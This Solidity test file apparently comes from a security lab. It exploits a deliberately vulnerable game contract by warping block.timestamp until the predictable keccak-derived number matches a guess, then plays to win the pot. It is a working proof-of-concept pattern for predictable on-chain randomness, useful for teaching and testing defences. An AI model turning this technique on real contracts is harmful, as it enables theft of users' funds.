// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/VulnerableTimestampGame.sol";

contract TimestampBruteForceExploitTest is Test {
    VulnerableTimestampGame public game;
    address public attacker = address(0x123);

    function setUp() public {
        game = new VulnerableTimestampGame();
        vm.deal(attacker, 10 ether);
        // vm.prank(attacker);
        // game.depositFunds{value: 10 ether}();
        vm.deal(address(game), 5 ether);
    }

    function testBruteForceTimestamp() public {
        vm.startPrank(attacker);

        // Step 1: Try different timestamps to force a win
        bool won = false;
        uint256 guessedNumber = 0; // Start guessing from 0

        for (uint256 i = 0; i < 20; i++) {
            // Try 10 different timestamps
            uint256 fakeTimestamp = block.timestamp + i;
            vm.warp(fakeTimestamp); // Manipulate timestamp
            console.log("Trying timestamp:", fakeTimestamp);

            // Generate the random number that the contract will use
            uint256 random = uint256(
                keccak256(abi.encodePacked(block.timestamp, attacker))
            ) % 10;
            console.log("Generated random number:", random);

            if (random == guessedNumber) {
                console.log("Found winning timestamp:", fakeTimestamp);
                won = true;
                break;
            }
        }

        console.log("isWon", won);
        // Step 2: If a winning timestamp was found, play the game with it
        if (won) {
            game.play{value: 1 ether}(guessedNumber);
            console.log("Attacker played with winning guess:", guessedNumber);
        }

        // Step 3: Check if the attack was successful
        uint256 lastWinTime = game.getLastWinTime();
        console.log("Last Win Time:", lastWinTime);
        console.log("Attacker Balance:", address(attacker).balance);
        console.log("Contract Balance:", address(game).balance);

        assertTrue(won, "Attack successful, found winning timestamp!");
        vm.stopPrank();
    }
}
